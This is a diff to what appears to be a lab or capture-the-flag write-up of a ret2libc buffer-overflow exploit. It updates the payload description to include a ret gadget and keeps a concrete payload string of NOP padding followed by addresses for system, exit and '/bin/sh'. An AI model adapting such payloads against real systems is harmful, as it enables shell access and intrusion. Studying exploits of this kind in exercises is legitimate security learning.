@@ -142,9 +142,8 @@ Given that the address of the `system` function begins with `0xb`, it cannot be 
 
 Alright, let's craft our payload:
 ```
-reminder: padding + address of system + address of exit + address of "/bin/sh"
+reminder: padding + address of ret + address of system + address of exit + address of "/bin/sh"
 
-0804853e b7e6b060 080483d0 b7f8cc58
 "\x90"*80 + "\x08\x04\x85\x3e" + "\xb7\xe6\xb0\x60" + "\x08\x04\x83\xd0" + "\xb7\xf8\xcc\x58"
 ```
 
